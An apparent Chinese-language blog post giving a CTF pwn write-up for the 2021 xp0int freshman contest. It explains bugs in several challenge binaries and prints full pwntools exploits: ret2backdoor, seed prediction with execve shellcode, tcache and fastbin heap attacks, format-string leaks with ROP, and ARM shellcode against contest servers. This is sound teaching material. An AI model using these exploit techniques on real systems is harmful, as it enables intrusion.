{"title":"2021xp0int杯新生赛 Pwn wp","date":"2021-12-13T15:52:05.000Z","toc":true,"source":"_posts/xp0intCTF-wp.md","raw":"---\ntitle: 2021xp0int杯新生赛 Pwn wp\ndate: 2021-12-13 23:52:05\ntoc: true\ncomments: true\ntags: \n  - CTF\n  - Pwn\n  - wp\n---\n\n#  div_overflow\n\n## 分析\n\n![image-20211126202845219](xp0intCTF-wp/image-20211126202845219.png)\n\n没开canary和PIE\n\n![image-20211126203002459](xp0intCTF-wp/image-20211126203002459.png)\n\ninit()函数发现有一个signal绑定，\n\n百度[C 库函数 – signal() | 菜鸟教程 (runoob.com)](https://www.runoob.com/cprogramming/c-function-signal.html)\n\n![image-20211126203057998](xp0intCTF-wp/image-20211126203057998.png)\n\n![image-20211126203140394](xp0intCTF-wp/image-20211126203140394.png)\n\n查看glibc源码可以发现，这个是将除零溢出错误信号绑定到backdoor函数上了（就是说触发这个信号，不会报错会直接跳转到对应函数运行）\n\n![image-20211126203309494](xp0intCTF-wp/image-20211126203309494.png)\n\nbackdoor函数发现栈溢出漏洞\n\n## SIGFPE信号的触发\n\n![image-20211126203459270](xp0intCTF-wp/image-20211126203459270.png)\n\nmain函数过程中有一个除法运算，但需要v4不为0才能进入，那么就不能构造1/0的形式\n\n由于计算机采用的是补码的表示方法，32位机器位可以表示的有符号整数范围为-2147483648~2,147,483,647\n\n发现构造-2147483648/-1=2147483648，会发生除法溢出，从而进入backdoor\n\n## Exp\n\n```python\nfrom pwn import *\n\nio = process('./div_overflow')\n# io = remote('35.229.138.83',14056)\n\nio.sendline('-2147483648')\nio.sendline('-1')\n\nshell = 0x0004007C8\n\nio.recvuntil('Hero, please leave your name :')\np = 'a' * 0x58 + p64(shell)\nio.sendline(p)\n\nio.interactive()\n```\n\n# guess\n\n![image-20211126224124359](xp0intCTF-wp/image-20211126224124359.png)\n\n没有开NX，存在shellcode执行\n\n![image-20211126224156281](xp0intCTF-wp/image-20211126224156281.png)\n\nmain函数调用game()，game()是主要逻辑，大概意思就是需要预测随机数，首先会使用时间播种\n\n![image-20211126224322214](xp0intCTF-wp/image-20211126224322214.png)\n\n然后随机生成16个字符，并存入s中\n\n![image-20211126224354047](xp0intCTF-wp/image-20211126224354047.png)\n\n最后需要我们输入16字符和s进行校验，校验成功就可以进入good()函数\n\n![image-20211126224423086](xp0intCTF-wp/image-20211126224423086.png)\n\nIDA分析good()函数的时候报错，只能看汇编了\n\n![image-20211126224821861](xp0intCTF-wp/image-20211126224821861.png)\n\n一通分析下来good函数就是shellcode后门，这样思路就很明确了，只需要预测随机数+shellcode\n\n## 预测随机数\n\n从Tover那里学来的方法，在本地写一个C程序\n\n```C\n#include<stdio.h>\n\nint main() {\n    int seed;\n    setbuf(stdin ,0);\n    setbuf(stdout, 0);\n    while (1)\n    {\n        printf(\"seed>\");\n        scanf(\"%d\", &seed);\n        srand(seed);\n        printf(\"ans>\");\n        for(int i = 0; i < 16; ++i) {\n            printf(\"%d \", rand() % 255);\n        } \n        printf(\"\\n\");\n    }\n}\n```\n\n然后在服务器运行的同时运行此程序，这样就可以设置相同的seed，自然随机出来的数据就是相同的\n\nshelldoe\n\n## Exp\n\n```python\nfrom pwn import *\n\ncontext.log_level='debug'\nrd = process('./rd')\n# io = process('./guess')\nio = remote('35.229.138.83', 16134)\n\ndef randchar(seed):\n    rd.recvuntil('seed>')\n    rd.sendline(str(seed))\n    rd.recvuntil('ans>')\n    arr = rd.recvuntil(' \\n', drop=True).split(' ')\n    arr = list(map(int, arr))\n    arr = ''.join(map(chr, arr))\n    return arr\n\n# print randchar(123456)  \nio.sendlineafter('May I have your name : ', 'asdfg')\nio.recvuntil('Branch hat : Now I tell you the essence of this spell is ')\ninp = int(io.recvuntil('\\n', drop=True))\nprint inp\np = randchar(inp)\nio.sendafter('Please enter the spell you understand : ', p)\n\np = '\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05'\nio.recvuntil('loud')\nio.sendline(p)\n\nio.interactive()\n\n```\n\n# H.E.A.P\n\n![image-20211126233747324](xp0intCTF-wp/image-20211126233747324.png)\n\n![image-20211126233759571](xp0intCTF-wp/image-20211126233759571.png)\n\n![image-20211126233841835](xp0intCTF-wp/image-20211126233841835.png)\n\n堆题，libc版本2.27存在tcache bin\n\n![image-20211126233920786](xp0intCTF-wp/image-20211126233920786.png)\n\n发现漏洞，free之后没有将指针清空，利用之后可以任意地址写\n\n## Exp\n\n```python\nfrom pwn import *\n\ncontext.log_level='debug'\nio = remote('35.229.138.83', 11009)\n# io = process(['./ld-2.27.so', './chall'], env={'LD_PRELOAD':'./libc-2.27.so'})\nlibc = ELF('./libc-2.27.so')\n\ndef add(idx, size):\n    io.sendlineafter('Your choice >> ', '1')\n    io.sendlineafter('Index: ', str(idx))\n    io.sendlineafter('Size: ', str(size))\n\ndef free(idx):\n    io.sendlineafter('Your choice >> ', '2')\n    io.sendlineafter('Index: ', str(idx))\n\ndef show(idx):\n    io.sendlineafter('Your choice >> ', '3')\n    io.sendlineafter('Index: ', str(idx))\n    \ndef edit(idx, content):\n    io.sendlineafter('Your choice >> ', '4')\n    io.sendlineafter('Index: ', str(idx))\n    io.sendlineafter('Content: ', content)\n\nmain_arena = 0x000003EBC40 \nfor i in range(8):\n    add(i, 0x90)\nadd(8, 0x90)\n\nfor i in range(8):\n    free(7-i)\n\n\nshow(0) # 泄露main_arana地址\nio.recvuntil('Content: ')\ninp = u64(io.recvuntil('\\n', drop=True).ljust(8,'\\0'))\nlibc_base = inp-96-main_arena\nprint hex(libc_base)\n\nogg = [0x4f3d5,0x4f432,0x10a41c] # one gadget\nedit(1, p64(libc_base + libc.sym['__free_hook'])) # 修改fd指针为__free_hook地址\nadd(10, 0x90)\nadd(11, 0x90) # 11号堆块在__free_hook位置\nedit(11, p64(ogg[1]+libc_base)) # 在__free_hook位置写入one gadget\n# gdb.attach(io)\n# add(12, 0x90)\nfree(0) # 除法free函数，执行ogg\n\nio.interactive()\n```\n\n具体利用方法见[CTF pwn题堆入门 -- Tcache bin_lifanxin的博客-CSDN博客](https://blog.csdn.net/A951860555/article/details/115442780?utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link)\n\n# BasicMath\n\n![image-20211126234339793](xp0intCTF-wp/image-20211126234339793.png)\n\n![image-20211126234403168](xp0intCTF-wp/image-20211126234403168.png)\n\n又有随机数，但这一次需要预测，直接利用python eval()计算结果就行，注意到有16个问题，当i==15是，会进入last_problem函数\n\n![image-20211126234530108](xp0intCTF-wp/image-20211126234530108.png)\n\n貌似没有什么问题\n\n再仔细观察就会发现，readint返回的是64位有符号整型数\n\n![image-20211126234625584](xp0intCTF-wp/image-20211126234625584.png)\n\n但进行校验的时候，取得是v5得高32位字节判断，所以只需要最后一次输入的数比较大就行\n\n![image-20211126234633993](xp0intCTF-wp/image-20211126234633993.png)\n\n然后就是进入gift函数\n\n![image-20211126235123293](xp0intCTF-wp/image-20211126235123293.png)\n\n发现有leak和溢出漏洞\n\n## Exp\n\n```python\nfrom pwn import *\n\ncontext.log_level='debug'\nio = remote('35.229.138.83',10874)\n# io = process(['./ld-2.27.so','./chall'], env={\"LD_PRELOAD\": './libc-2.27.so'})\nlibc = ELF('./libc-2.27.so')\n\nfor i in range(15):\n    io.recvuntil(']')\n    inp = io.recvuntil(' = ?', drop=True)\n    ans = eval(inp)\n    io.sendline(str(ans))\n\nio.recvuntil(' = ?')\nio.sendline('11111111111111')\nogg = [0x4f3d5,0x4f432,0x10a41c]\n\n# gdb.attach(io)\nprint io.recv(8)\ncanary = u64(io.recv(8).ljust(8, '\\0')) # 泄露canary\nstack = u64(io.recv(8).ljust(8, '\\0')) # 泄露栈地址\nfunc_base = u64(io.recv(8).ljust(8, '\\0')) - 0x000000000000168A # 泄露函数加载地址\nio.recv(8 * 5)\nlibc_base = u64(io.recv(8).ljust(8, '\\0')) - 231 - libc.sym['__libc_start_main'] # 泄露libc基址\nprint hex(canary)\nprint hex(func_base)\nprint hex(libc_base)\npop_rdi = 0x00000001713 + func_base\nlibc.address = libc_base\n\np = p64(canary) + p64(0) + p64(pop_rdi+1) + p64(pop_rdi) + p64(stack) + p64(libc.sym['system']) + p64(0xdeadbeaf) + '/bin/sh\\0'\nio.send(p)\n\nio.interactive()\n    \n```\n\n\n\n# easyheap\n\n![image-20211126235844561](xp0intCTF-wp/image-20211126235844561.png)\n\n![image-20211126235859619](xp0intCTF-wp/image-20211126235859619.png)\n\n又是堆题，libc版本2.23没有tcache\n\n![image-20211126235945221](xp0intCTF-wp/image-20211126235945221.png)\n\n![image-20211126235953460](xp0intCTF-wp/image-20211126235953460.png)\n\n![image-20211127000000431](xp0intCTF-wp/image-20211127000000431.png)\n\n似曾相识的tea，这个题目构造貌似在那里见过？（难道是那个某省的第一届攻防大赛？）\n\n## tea解密\n\n本地写一个c10udlnk教我的tea解密脚本\n\n```c\n#include <stdio.h>\n#include <stdint.h>\nvoid decrypt (uint32_t* v, uint32_t* k, uint32_t delta) {\n    uint32_t v0=v[0], v1=v[1], sum=delta*32, i;  /* set up */\n    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */\n    for (i=0; i<32; i++) {                         /* basic cycle start */\n        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);\n        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);\n        sum -= delta;\n    }                                              /* end cycle */\n    v[0]=v0; \n    v[1]=v1;\n}\n\nint main()\n{\n    uint32_t c[2] = {0};\n    uint32_t k[4];\n    uint32_t del;\n    memcpy((char*)k, \"ggslggyzgghysdyy\", sizeof(k));\n\n    scanf(\"%x %x %u\", &c[0], &c[1], &del);\n    decrypt(c, k, del);\n    printf(\"%x %x\\n\", c[0], c[1]);\n    return 0;\n}\n```\n\n## double free\n\nfree函数\n\n![image-20211127000428499](xp0intCTF-wp/image-20211127000428499.png)\n\n清零过程\n\n![image-20211127000437945](xp0intCTF-wp/image-20211127000437945.png)\n\n会发现第15个块，会被free但不会清零\n\n之后就是fastbin的double free攻击\n\n## Exp\n\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\n\ndef tea(c1, c2, de):\n    c1 = hex(c1)\n    c2 = hex(c2)\n    teaio = process('./tea')\n    teaio.sendline(c1 + ' ' + c2 + ' ' + str(de))\n    r = teaio.recvuntil('\\n', drop=True).split(' ')\n    return int(r[0], 16), int(r[1], 16)\n\nio = remote('35.229.138.83',11967)\n# io = process(['./ld-2.23.so','./pwn'], env={'LD_PRELOAD':'./libc.so'})\nlibc = ELF('./libc.so')\n\nio.recvuntil('Your secret key: ')\nd = int(io.recvuntil('\\n', drop=True))\nio.recvuntil('My gift: ')\ns = io.recvuntil('\\n').split(',')\ncc0, cc1 = int(s[0], 16), int(s[1], 16)\np0, p1 = tea(cc0, cc1, d)\nio.recvuntil('Your gift: ')\nio.sendline(str(p0) + ',' + str(p1))\n\ndef add(idx, size, content):\n    io.sendlineafter('choice >>', '1')\n    io.sendlineafter('id: ', str(idx))\n    io.sendlineafter('size: ', str(size))\n    io.sendlineafter('content: ', content)\n\ndef free():\n    io.sendlineafter('choice >>', '2')\n\ndef show():\n    io.sendlineafter('choice >>', '1638')\n    io.recvuntil('Your gift: ')\n    return int(io.recvuntil('\\n', drop=True), 16)\n\nogg = [0x45226,0x4527a,0xf03a4,0xf1247]\nlibc.address = show() - libc.sym['puts']\nprint hex(libc.address)\n\nadd(15, 0x60, 'aaa')\nfree()\nadd(13, 0x60, 'aaa') # 13位置地址 == 15位置地址\nadd(14, 0x60, 'aaa') # 中间有一个绕过double free检查\nfree()\nadd(0, 0x60, p64(libc.sym['__malloc_hook']-0x23))\nadd(1, 0x60, 'aaaa')\nadd(2, 0x60, 'aaaa')\nadd(3, 0x68, '\\0'*19 + p64(libc.address + ogg[3]))\n# gdb.attach(io)\nio.sendlineafter('choice >>', '1')\nio.sendlineafter('id: ', '4')\nio.sendlineafter('size: ', '20')\n# free()\n\nio.interactive()\n```\n\nfastbin double free利用方法见[CTF pwn题堆入门 -- Fast bin_lifanxin的博客-CSDN博客](https://blog.csdn.net/A951860555/article/details/115496056)\n\n# gift\n\n![image-20211127000816797](xp0intCTF-wp/image-20211127000816797.png)\n\n![image-20211127000919468](xp0intCTF-wp/image-20211127000919468.png)\n\n发现沙盒使用seccomp-tools，查看发现execve函数被禁用了，也就是说不能调用system、shellcode getshell这些getshell，解决方法orw（open、read、write），原理就是open打开本地文件，read读取进入内存，write打印到屏幕\n\n![image-20211127000958031](xp0intCTF-wp/image-20211127000958031.png)\n\n![image-20211127001150997](xp0intCTF-wp/image-20211127001150997.png)\n\ngift函数发现有一个格式化字符串漏洞，可以泄露栈地址、libc地址和函数加载地址\n\n![image-20211127001405741](xp0intCTF-wp/image-20211127001405741.png)\n\nmain函数发现有一个栈溢出的漏洞，但只能覆盖返回地址，不能直接构造ROP，但发现name在bss段，可以先在name函数中布置rop，然后利用两次leave;retn劫持rsp，实现栈迁移到bss，执行在name中构造的rop\n\n## ROP\n\nrop思路首先需要实现orw，需要编写shellcode\n\n```python\nsc = asm(shellcraft.open('./flag'))\nsc += asm(shellcraft.read(3, 0x00002020cf + elf.address, 0x30))\nsc += asm(shellcraft.write(1, 0x00002020cf + elf.address, 0x30))\n```\n\n然后需要调用libc中的mprotect函数，将bss段权限改为可读可写可执行，最后跳转到shellcode上\n\n## Exp\n\n```python\nfrom pwn import *\n\ncontext.log_level='debug'\n\ncontext(arch='amd64')\nio = remote('35.229.138.83', 13789)\n# io = process(['./ld-2.27.so','./gift'], env={\"LD_PRELOAD\": './libc-2.27.so'})\nlibc = ELF('./libc-2.27.so')\nelf = ELF('./gift')\nname = 0x0000000202060\n\n# gdb.attach(io)\nio.recvuntil('this the gift for you.\\n')\nio.send('%9$p-%19$p-%11$p')\n\nio.recvuntil('0x')\ncanary = int(io.recvuntil('-', drop=True), 16)\n\n\nstart_main = int(io.recvuntil('-', drop=True), 16)\nlibc_base = start_main - 231 - libc.sym['__libc_start_main']\nprint hex(libc_base)\nlibc.address = libc_base\n\ninp = int(io.recv(14), 16)\nprint hex(inp)\nelf.address = inp - 0x000000B78 - 43\nprint hex(elf.address)\n\npop_rdi = elf.address + 0x000000000000C73\npop_rsi = libc_base + 0x0000000000023eea\npop_rdx = libc_base + 0x0000000000001b96\nprint hex(pop_rdi)\nprint hex(pop_rsi)\nprint hex(pop_rdx)\nprint hex(libc.sym['system'])\n\nsc = asm(shellcraft.open('./flag')) # open(\"./flag\")\nsc += asm(shellcraft.read(3, 0x00002020cf + elf.address, 0x30)) # read(3, buf, 0x30)\nsc += asm(shellcraft.write(1, 0x00002020cf + elf.address, 0x30)) # write(1, buf, 0x30)\nprint len(sc)\nprint sc\nprint libc.sym['mprotect']\n\np = sc\np += p64(0) + p64(pop_rdx) + p64(0x7) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdi) + p64((elf.address + name) & 0xffffffffff000) + p64(libc.sym['mprotect']) + p64(elf.address + name)\nprint len(p)\nio.sendlineafter('please input your name:\\n', p)\n\n# gdb.attach(io)\np = 'a' * (0x30 - 8) + p64(canary) + p64(elf.address + name + len(sc)) + p64(elf.address + 0x0000000C00)\nio.recvuntil('what do you want to say?\\n')\nio.send(p)\n\n\nio.interactive()\n# flag{gO\n```\n\n# babystack\n\n异构pwn耶！\n\n![image-20211127002135923](xp0intCTF-wp/image-20211127002135923.png)\n\n保护全关\n\n![image-20211127002336060](xp0intCTF-wp/image-20211127002336060.png)\n\n发现有一个格式化字符串漏洞，可以泄露栈地址\n\n查阅一番资料，并看汇编发现，arm架构下PC也会存放在栈上，动态调试一番就可以算到偏移量\n\n![image-20211127002833507](xp0intCTF-wp/image-20211127002833507.png)\n\n然后再v6中编写shellcode，并跳转执行即可\n\n```python\nfrom pwn import *\n\n# io = process(['qemu-arm','-g','1234','./pwn'])\n# io = process(['qemu-arm','./pwn'])\nio = remote('35.229.138.83', 10008)\n\n# gdb.attach(io)\nio.recvuntil('I am a repeater without any emotion.\\n')\nio.send('%1$p')\nstack = int(io.recvuntil('Do you have any questions?', drop=True), 16)\nprint hex(stack)\n\ncontext(arch='arm')\np = 'a' * 8 + p32(stack + 0x4 * 3) + asm(shellcraft.sh())\nio.sendline(p)\n\nio.interactive()\n```\n\n# by Csome\n\n!!!暨南大学xp0int杯wp收集截止前禁止发送给暨南大学的同学，产生的后果由转发者承担!!!\n","slug":"xp0intCTF-wp","published":true,"updated":"2025-10-28T08:00:40.791Z","_id":"cuidqs-4H1se3viecCo3JDGCf","comments":true,"layout":"post","photos":[],"html":"<h1 id=\"div-overflow\"><a href=\"#div-overflow\" class=\"headerlink\" title=\"div_overflow\"></a>div_overflow</h1><h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/p/xp0intCTF-wp/image-20211126202845219.png\" alt=\"image-20211126202845219\"></p>\n<p>没开canary和PIE</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126203002459.png\" alt=\"image-20211126203002459\"></p>\n<p>init()函数发现有一个signal绑定，</p>\n<p>百度<a href=\"https://www.runoob.com/cprogramming/c-function-signal.html\">C 库函数 – signal() | 菜鸟教程 (runoob.com)</a></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126203057998.png\" alt=\"image-20211126203057998\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126203140394.png\" alt=\"image-20211126203140394\"></p>\n<p>查看glibc源码可以发现，这个是将除零溢出错误信号绑定到backdoor函数上了（就是说触发这个信号，不会报错会直接跳转到对应函数运行）</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126203309494.png\" alt=\"image-20211126203309494\"></p>\n<p>backdoor函数发现栈溢出漏洞</p>\n<h2 id=\"SIGFPE信号的触发\"><a href=\"#SIGFPE信号的触发\" class=\"headerlink\" title=\"SIGFPE信号的触发\"></a>SIGFPE信号的触发</h2><p><img src=\"/p/xp0intCTF-wp/image-20211126203459270.png\" alt=\"image-20211126203459270\"></p>\n<p>main函数过程中有一个除法运算，但需要v4不为0才能进入，那么就不能构造1&#x2F;0的形式</p>\n<p>由于计算机采用的是补码的表示方法，32位机器位可以表示的有符号整数范围为-2147483648~2,147,483,647</p>\n<p>发现构造-2147483648&#x2F;-1&#x3D;2147483648，会发生除法溢出，从而进入backdoor</p>\n<h2 id=\"Exp\"><a href=\"#Exp\" class=\"headerlink\" title=\"Exp\"></a>Exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&#x27;./div_overflow&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># io = remote(&#x27;35.229.138.83&#x27;,14056)</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(<span class=\"string\">&#x27;-2147483648&#x27;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&#x27;-1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">shell = <span class=\"number\">0x0004007C8</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;Hero, please leave your name :&#x27;</span>)</span><br><span class=\"line\">p = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x58</span> + p64(shell)</span><br><span class=\"line\">io.sendline(p)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"guess\"><a href=\"#guess\" class=\"headerlink\" title=\"guess\"></a>guess</h1><p><img src=\"/p/xp0intCTF-wp/image-20211126224124359.png\" alt=\"image-20211126224124359\"></p>\n<p>没有开NX，存在shellcode执行</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126224156281.png\" alt=\"image-20211126224156281\"></p>\n<p>main函数调用game()，game()是主要逻辑，大概意思就是需要预测随机数，首先会使用时间播种</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126224322214.png\" alt=\"image-20211126224322214\"></p>\n<p>然后随机生成16个字符，并存入s中</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126224354047.png\" alt=\"image-20211126224354047\"></p>\n<p>最后需要我们输入16字符和s进行校验，校验成功就可以进入good()函数</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126224423086.png\" alt=\"image-20211126224423086\"></p>\n<p>IDA分析good()函数的时候报错，只能看汇编了</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126224821861.png\" alt=\"image-20211126224821861\"></p>\n<p>一通分析下来good函数就是shellcode后门，这样思路就很明确了，只需要预测随机数+shellcode</p>\n<h2 id=\"预测随机数\"><a href=\"#预测随机数\" class=\"headerlink\" title=\"预测随机数\"></a>预测随机数</h2><p>从Tover那里学来的方法，在本地写一个C程序</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> seed;</span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stdin</span> ,<span class=\"number\">0</span>);</span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;seed&gt;&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>, &amp;seed);</span><br><span class=\"line\">        srand(seed);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;ans&gt;&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">16</span>; ++i) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>, rand() % <span class=\"number\">255</span>);</span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后在服务器运行的同时运行此程序，这样就可以设置相同的seed，自然随机出来的数据就是相同的</p>\n<p>shelldoe</p>\n<h2 id=\"Exp-1\"><a href=\"#Exp-1\" class=\"headerlink\" title=\"Exp\"></a>Exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">rd = process(<span class=\"string\">&#x27;./rd&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># io = process(&#x27;./guess&#x27;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;35.229.138.83&#x27;</span>, <span class=\"number\">16134</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">randchar</span>(<span class=\"params\">seed</span>):</span><br><span class=\"line\">    rd.recvuntil(<span class=\"string\">&#x27;seed&gt;&#x27;</span>)</span><br><span class=\"line\">    rd.sendline(<span class=\"built_in\">str</span>(seed))</span><br><span class=\"line\">    rd.recvuntil(<span class=\"string\">&#x27;ans&gt;&#x27;</span>)</span><br><span class=\"line\">    arr = rd.recvuntil(<span class=\"string\">&#x27; \\n&#x27;</span>, drop=<span class=\"literal\">True</span>).split(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    arr = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"built_in\">int</span>, arr))</span><br><span class=\"line\">    arr = <span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">map</span>(<span class=\"built_in\">chr</span>, arr))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print randchar(123456)  </span></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;May I have your name : &#x27;</span>, <span class=\"string\">&#x27;asdfg&#x27;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;Branch hat : Now I tell you the essence of this spell is &#x27;</span>)</span><br><span class=\"line\">inp = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span> inp</span><br><span class=\"line\">p = randchar(inp)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&#x27;Please enter the spell you understand : &#x27;</span>, p)</span><br><span class=\"line\"></span><br><span class=\"line\">p = <span class=\"string\">&#x27;\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05&#x27;</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;loud&#x27;</span>)</span><br><span class=\"line\">io.sendline(p)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"H-E-A-P\"><a href=\"#H-E-A-P\" class=\"headerlink\" title=\"H.E.A.P\"></a>H.E.A.P</h1><p><img src=\"/p/xp0intCTF-wp/image-20211126233747324.png\" alt=\"image-20211126233747324\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126233759571.png\" alt=\"image-20211126233759571\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126233841835.png\" alt=\"image-20211126233841835\"></p>\n<p>堆题，libc版本2.27存在tcache bin</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126233920786.png\" alt=\"image-20211126233920786\"></p>\n<p>发现漏洞，free之后没有将指针清空，利用之后可以任意地址写</p>\n<h2 id=\"Exp-2\"><a href=\"#Exp-2\" class=\"headerlink\" title=\"Exp\"></a>Exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span 